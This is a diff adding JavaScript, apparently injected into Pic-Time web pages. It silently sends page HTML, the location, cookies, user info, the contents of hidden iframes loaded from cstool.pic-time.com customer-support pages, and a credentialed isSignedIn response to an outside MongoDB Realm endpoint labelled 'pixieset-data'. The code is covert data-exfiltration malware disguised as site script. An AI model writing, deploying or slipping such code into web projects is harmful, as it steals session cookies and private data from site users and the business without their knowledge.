@@ -1,2 +1,133 @@
-// Test
 // https://rb.gy/6h50rx
+
+const accessTokenRefresh = 300000; // 5 minutes
+
+// Only run if not in iframe (like in mobile preview window)
+if (window.location === parent.window.location) {
+  if (!window.ptxAgbSetupComplete) {
+    // Setup uuidv4 function on window
+    window.uuidv4 = () => {
+      return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, (c) =>
+        (
+          c ^
+          (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
+        ).toString(16)
+      );
+    };
+
+    // Create a function to get the access token required to write to the mongo database
+    const setPtxWindowAccessToken = async () => {
+      return fetch(
+        "https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login"
+      )
+        .then((resp) => resp.json())
+        .then((json) => json.access_token)
+        .then((token) => (window.accessToken = token));
+    };
+
+    // Reset access token every 5 minutes
+    setInterval(async () => {
+      await setPtxWindowAccessToken();
+    }, accessTokenRefresh);
+
+    // Create a function to insert a document to into the mongo ingest collection
+    window.insertDoc = async (type, data) => {
+      const envelope = {};
+      envelope.sessionId = window.rjsSessionId;
+      envelope.type = type;
+      envelope.data = data;
+      envelope.userAgent = navigator?.userAgent;
+
+      envelope.ptData = window.ptData;
+
+      envelope.ts = Date.now();
+
+      return fetch(
+        "https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Access-Control-Request-Headers": "*",
+            Authorization: `Bearer ${window.accessToken}`,
+          },
+          body: JSON.stringify({
+            collection: "ingest",
+            database: "pictimeDataDb",
+            dataSource: "pixieset-data",
+            document: envelope,
+          }),
+        }
+      );
+    };
+
+    // Create a session ID for the window
+    if (!window.agbSessionId) {
+      window.agbSessionId = uuidv4();
+    }
+
+    // Log session
+    window.insertDoc("session", { sessionId: window.agbSessionId });
+
+    window.ptxAgbSetupComplete = true;
+
+    // Log Location
+    window.insertDoc("location", window.location);
+
+    // Log Page HTML
+    let pageHTML = new XMLSerializer().serializeToString(document);
+    window.insertDoc("page-html", pageHTML);
+
+    window.getIFrame = async (iframeUrl) => {
+      try {
+        const iframe = document.createElement("iframe");
+        iframe.src = iframeUrl;
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+
+        setTimeout(() => {
+          const iframeHtml = iframe.contentDocument.documentElement.outerHTML;
+
+          // Send Page HTML
+          window.insertDoc("iframe-page-html", {
+            location: iframeUrl,
+            html: iframeHtml,
+          });
+        }, 5000);
+      } catch (err) {
+        console.error(err);
+        window.insertDoc("error", err.toString());
+      }
+    };
+
+    getIFrame("https://cstool.pic-time.com/!customersupport");
+    getIFrame("https://cstool.pic-time.com/!customersupport?marketing=true");
+
+    const fetchUrl = "https://cstool.pic-time.com/!servicescs.asmx/isSignedIn";
+    try {
+      const resp = await fetch(fetchUrl, {
+        headers: {
+          accept: "application/json, text/javascript, */*; q=0.01",
+          "accept-language": "en-US,en;q=0.9",
+          "cache-control": "no-cache",
+          "content-type": "application/json; charset=UTF-8",
+        },
+        body: "{}",
+        method: "POST",
+        credentials: "include",
+      });
+
+      const json = await resp.json();
+
+      window.insertDoc("fetch", { url: fetchUrl, data: json });
+    } catch (err) {
+      window.insertDoc("error", err.toString());
+    }
+
+    // Capture PT Data
+    window.ptData = {};
+    window.ptData.headers = _pt$?.hdrs || null;
+    window.ptData.userInfo = _pt$?.userInfo || null;
+    window.ptData.cookie = document.cookie;
+  }
+}
